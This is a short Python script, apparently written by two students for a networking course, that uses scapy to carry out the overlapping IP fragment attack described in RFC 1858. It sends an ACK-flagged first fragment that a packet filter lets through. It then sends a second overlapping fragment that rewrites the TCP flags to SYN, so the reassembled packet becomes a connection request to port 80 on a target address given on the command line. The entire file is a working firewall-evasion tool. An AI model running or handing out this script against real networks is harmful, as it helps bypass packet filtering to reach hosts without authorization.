#this code was written by Dina and Ryan
from scapy.all import *
import random as rand
dest=str(sys.argv[1])#the user inputs the ip destination as the first argument after the filename when running the attack
nbofpkts=str(sys.argv[2])#the users input the desired number of fragments they'd like to send as the second argument after the destination ip
sport=rand.randint(1024,65535)
#This attack is implemented from concept of the RFC1858 file on moodle, example 4.1
for i in range(int(nbofpkts)):
    data="data"*24
    f1 = IP(dst=dest, id=1, frag=0, flags="MF")/TCP(sport=sport, dport=80, seq=100,flags='A', ack=1)#First send a fragment with SYN=0 and ACK=1 with an offset of 0, this fragment will be able to pass
    f2 = IP(dst=dest, id=1, frag=1, flags=0)/TCP(sport=sport, dport=80, seq=100, flags='S', ack=0)/data#then send another fragment with offset 8 but with a different value of SYN and ACK, set SYN=1 and ACK=0 to overwrite the flags in the first fragment
    send(f1)
    send(f2)
#This will reconstitute the packet as a connection request
